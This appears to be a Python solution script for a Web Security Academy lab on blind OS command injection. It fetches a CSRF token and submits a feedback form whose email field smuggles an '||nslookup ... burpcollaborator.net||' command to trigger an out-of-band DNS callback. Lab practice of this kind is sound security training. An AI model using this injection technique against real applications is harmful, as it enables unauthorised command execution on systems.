import requests
import sys
import re
from bs4 import BeautifulSoup


s = requests.Session()

feedback_url = 'https://ac1c1f321e92cabbc0cb0f60005400f5.web-security-academy.net/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = 'https://ac1c1f321e92cabbc0cb0f60005400f5.web-security-academy.net/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'hey',
    'email' : 'adlerm731@gmail.com||nslookup+adlerm731@gmail.com.burpcollaborator.net||',
    'subject' : 'nada',
    'message' : 'e pues nada'
}
resp = s.post(feedback_submit_url, data=post_data)
print (resp.text)
